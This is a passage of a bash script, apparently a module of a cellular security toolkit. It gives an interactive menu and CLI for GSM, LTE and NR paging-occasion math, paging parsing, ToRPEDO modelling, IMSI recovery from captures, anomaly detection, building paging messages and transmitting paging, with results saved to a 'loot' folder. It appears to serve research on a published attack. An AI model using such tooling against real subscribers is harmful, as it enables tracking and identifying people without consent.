    printf 'timing\t%s\n' "the block repeats every BS_PA_MFRMS * 51 TDMA frames (235.4 ms per multiframe); at BS_PA_MFRMS=2 that is 470.8 ms, and the SDR must hold that cadence for the paging cycle"
    printf 'next_step\t%s\n' "capture the paging channel of the target cell with --paging-parse to confirm PF/PO before any transmit work"
    return 3
}

# ── menu ────────────────────────────────────────────────────────────────
pgt_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== paging track ===${C_RESET}"
        echo -e "  loot: ${C_DIM}$PGT_DIR${C_RESET}\n"
        cat <<'M'
  [1]  GSM paging occasion  (IMSI mod 1000)
  [2]  LTE paging frame/occasion  (TS 36.304)
  [3]  NR paging frame/occasion   (TS 38.304)
  [4]  parse a paging record (hex)
  [5]  ToRPEDO model from a capture
  [6]  IMSI recovery: correlate candidates against a capture
  [7]  detect a paging anomaly in a capture
  [8]  write a handoff plan (torpedo / piercer)
  [9]  eDRX cycle and PTW paging occasions
  [10] NR paging early indication (PEI) and subgroup
  [11] per-UE paging history across captures
  [12] paging cause / CN domain
  [13] GSM page mode and channel needed
  [14] build a paging message
  [15] transmit paging (honest-fail without an SDR)
  [0]  back

M
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1) read -rp "  IMSI> " i; read -rp "  BS_PA_MFRMS (2-9)> " m
               pgt_cmd_po "$i" "$m" gsm | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            2) read -rp "  IMSI (UE_ID = IMSI mod 1024)> " i
               read -rp "  T (32|64|128|256)> " t
               read -rp "  nB (blank = T)> " nb
               pgt_cmd_po "$i" "$t" lte "$nb" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            3) read -rp "  UE_ID (5G-S-TMSI mod 1024)> " i
               read -rp "  T (32|64|128|256)> " t
               read -rp "  nB (blank = T)> " nb
               read -rp "  PF_offset (0-3)> " off
               pgt_cmd_po "$i" "$t" nr "$nb" "$off" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            4) read -rp "  hex> " x; read -rp "  gen (gsm|lte|nr)> " g
               pgt_cmd_paging_parse "$x" "$g" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            5) read -rp "  pcap> " p; pgt_cmd_torpedo "$p" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            6) read -rp "  candidates file> " cf; read -rp "  pcap> " p
               pgt_cmd_piercer "$cf" "$p" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            7) read -rp "  pcap> " p; pgt_cmd_detect "$p" | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            8) read -rp "  plan (torpedo|piercer)> " k; pgt_plan "$k"; read -rp "  press enter " _ ;;
            9) pgt_cli_edrx_occ | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            10) pgt_cli_pei_occ | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            11) pgt_cli_paging_history | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            12) pgt_cli_paging_cause | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            13) pgt_cli_page_mode | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            14) pgt_cli_build_paging_req | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            15) pgt_tx_paging | column -t -s$'\t' 2>/dev/null || true
               read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
pgt_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)       pgt_cli_status_tsv ;;
        --po)               pgt_cmd_po "${1:-}" "${2:-}" "${3:-gsm}" "${4:-}" "${5:-}" ;;
        --paging-parse)     pgt_cmd_paging_parse "${1:-}" "${2:-gsm}" ;;
        --torpedo-model)    pgt_cmd_torpedo "${1:-}" ;;
        --piercer-correlate) pgt_cmd_piercer "${1:-}" "${2:-}" "${3:-6}" ;;
        --detect)           pgt_cmd_detect "${1:-}" ;;
        --plan)             pgt_plan "${1:-}" ;;
        --edrx-occ)         pgt_cli_edrx_occ "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" ;;
        --pei-occ)          pgt_cli_pei_occ "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-}" ;;
        --paging-history)   pgt_cli_paging_history "$@" ;;
        --paging-cause)     pgt_cli_paging_cause "${1:-}" "${2:-}" ;;
        --page-mode)        pgt_cli_page_mode "${1:-}" ;;
        --build-paging-req) pgt_cli_build_paging_req "${1:-}" "${2:-}" ;;
        --paging-tx)        pgt_tx_paging "${1:-}" ;;
        --selftest)         pgt_selftest ;;
        --menu)             pgt_menu ;;
        *)
            cat >&2 <<EOF
Paging Track — paging occasions, ToRPEDO, paging-based IMSI recovery

Usage: $0 COMMAND
  --status-tsv                          module state as TSV
  --po <imsi> <mfrms|T> <gsm|lte|nr> [nB] [pf_offset|fdd|tdd]
                                        paging group/block or PF/PO
  --paging-parse <hex> [gsm|lte|nr]     paging record identity and value
  --torpedo-model <pcap>                collision and response-timing model
  --piercer-correlate <cands> <pcap> [mfrms]
                                        rank candidate IMSIs by occasion
  --detect <pcap>                       paging-anomaly signals and verdict
  --edrx-occ <imsi|ue_id> <TeDRX> <PTW> [T] [nB]
                                        eDRX PTW start and the POs inside it
  --pei-occ <5g-s-tmsi|ue_id> [T] [nB] [pf_offset] [N_subgroup]
                                        NR paging-early-indication occasion
  --paging-history [--flapping-tsv] <pcap>...
                                        per-UE page counts across captures
  --paging-cause <hex> [gsm|lte|nr]     paging cause / CN domain
  --page-mode <RR octets>               GSM page mode and channel needed
  --build-paging-req <gsm|lte|nr> <k=v,...>
                                        build a paging message, byte-exact
  --paging-tx <pcap>                    transmit paging (honest-fail, no SDR)
  --plan <torpedo|piercer>              write a handoff plan
  --selftest                            verify arithmetic and parsers, no radio
  --menu                                interactive menu

Formulas (cited): TS 45.002 6.5.2 (GSM), TS 36.304 7.2 (LTE PO), TS 36.304
7.4 (LTE eDRX/PTW), TS 38.304 7.1 (NR PF/PO), TS 38.304 7.2 (NR PEI/subgroup),
TS 44.018 9.1.22/9.1.23/9.1.24 + 10.5.2.26 + 10.5.2.8 (GSM paging request), TS 38.331 6.3.2 (NR paging
cause). ToRPEDO and paging-based IMSI recovery: Hussain, Echeverria, Chowdhury,
Li, Bertino, NDSS 2019.
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    pgt_cli_main "$@"
fi
